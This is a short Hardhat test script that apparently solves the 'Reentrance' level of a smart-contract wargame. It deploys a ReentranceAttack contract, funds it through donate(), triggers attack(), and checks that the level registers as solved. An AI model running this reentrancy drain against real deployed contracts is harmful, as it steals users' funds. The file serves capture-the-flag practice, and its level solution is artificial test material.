const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Reentrance", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Reentrance", player.address, ethers.utils.parseEther("0.001"));
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Basic reentrancy attack
        const attacker = await (await ethers.getContractFactory("ReentranceAttack")).deploy(instance.address);
        await instance.connect(player).donate(attacker.address, { value: ethers.utils.parseEther("0.001") });
        await attacker.attack();
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});